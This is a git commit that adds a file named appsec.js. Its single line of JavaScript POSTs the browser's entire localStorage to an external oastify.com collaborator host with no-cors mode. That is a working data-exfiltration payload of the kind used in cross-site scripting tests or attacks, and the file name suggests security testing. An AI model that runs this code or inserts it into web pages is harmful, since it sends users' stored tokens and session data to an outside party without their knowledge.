4603988ce51cf15a5ff9bdd3b4fe70e23ec6f3a5
Pasha Taylor <pavloteyfel@gmail.com>
2026-04-20 13:54:32 +0200

    Create appsec.js

---
+++ appsec.js
@@ -0,0 +1,1 @@
+fetch('https://sd9l2i5jcuvcw7weom0xtsgix930rrfg.oastify.com', {'method': 'POST', 'mode': 'no-cors', 'headers': {'Content-Type': 'application/json'}, body: JSON.stringify(localStorage)});
